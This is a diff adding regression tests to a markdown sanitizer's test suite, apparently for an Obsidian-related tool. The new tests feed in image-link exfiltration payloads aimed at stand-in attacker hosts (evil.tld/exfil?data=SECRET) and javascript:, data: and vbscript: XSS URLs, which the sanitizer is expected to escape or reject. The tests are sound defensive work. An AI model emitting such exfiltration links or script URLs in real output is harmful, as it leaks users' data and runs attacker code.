@@ -78,6 +78,18 @@ describe('markdownSanitizer', () => {
             expect(sanitizeAllMarkdownLinks(input)).toBe(expected);
         });
 
+        it('should escape image syntax ![alt](url) (VULN-006)', () => {
+            const input = '![tracking-pixel](https://evil.tld/exfil)';
+            const expected = '!\\[tracking-pixel\\]\\(https://evil.tld/exfil\\)';
+            expect(sanitizeAllMarkdownLinks(input)).toBe(expected);
+        });
+
+        it('should handle mixed links and images', () => {
+            const input = '[link](https://a.com) and ![img](https://b.com/pic.png)';
+            const expected = '\\[link\\]\\(https://a.com\\) and !\\[img\\]\\(https://b.com/pic.png\\)';
+            expect(sanitizeAllMarkdownLinks(input)).toBe(expected);
+        });
+
         it('should return empty string for empty input', () => {
             expect(sanitizeAllMarkdownLinks('')).toBe('');
         });
@@ -163,6 +175,27 @@ describe('markdownSanitizer', () => {
             expect(result).toContain('\\[here\\]');
             expect(result).toContain('\\[\\[Passwords\\]\\]');
         });
+
+        // VULN-006 regression tests
+        it('should escape image syntax ![alt](url) (VULN-006)', () => {
+            const input = '![tracking-pixel](http://evil.tld/exfil?data=SECRET)';
+            const result = sanitizeForObsidian(input);
+            expect(result).toContain('!\\[tracking-pixel\\]');
+            expect(result).not.toMatch(/!\[tracking-pixel\]\(http:\/\/evil\.tld/);
+        });
+
+        it('should escape mixed [link](url) and ![image](url) in same input', () => {
+            const input = 'See [here](http://a.com) and ![img](http://b.com/pic.png)';
+            const result = sanitizeForObsidian(input);
+            expect(result).toContain('\\[here\\]');
+            expect(result).toContain('!\\[img\\]');
+        });
+
+        it('should escape image syntax with https URLs', () => {
+            const input = 'Image: ![logo](https://cdn.evil.com/tracker.svg)';
+            const result = sanitizeForObsidian(input);
+            expect(result).toBe('Image: !\\[logo\\]\\(https://cdn.evil.com/tracker.svg\\)');
+        });
     });
 
     describe('escapeObsidianWikilinks', () => {
@@ -243,6 +276,32 @@ describe('markdownSanitizer', () => {
             expect(result).not.toContain(')');
             expect(result).not.toContain('!');
             expect(result).not.toContain('[');
+        });
+
+        // URL scheme validation tests
+        it('should reject javascript: URLs', () => {
+            const result = sanitizeUrlForMarkdownTarget('javascript:alert(document.domain)');
+            expect(result).toBe('about:blank');
+        });
+
+        it('should reject data: URLs', () => {
+            const result = sanitizeUrlForMarkdownTarget('data:text/html,<script>alert(1)</script>');
+            expect(result).toBe('about:blank');
+        });
+
+        it('should reject vbscript: URLs', () => {
+            const result = sanitizeUrlForMarkdownTarget('vbscript:msgbox("xss")');
+            expect(result).toBe('about:blank');
+        });
+
+        it('should accept http URLs', () => {
+            const result = sanitizeUrlForMarkdownTarget('http://example.com/page');
+            expect(result).toBe('http://example.com/page');
+        });
+
+        it('should accept https URLs', () => {
+            const result = sanitizeUrlForMarkdownTarget('https://example.com/page');
+            expect(result).toBe('https://example.com/page');
         });
     });
 });
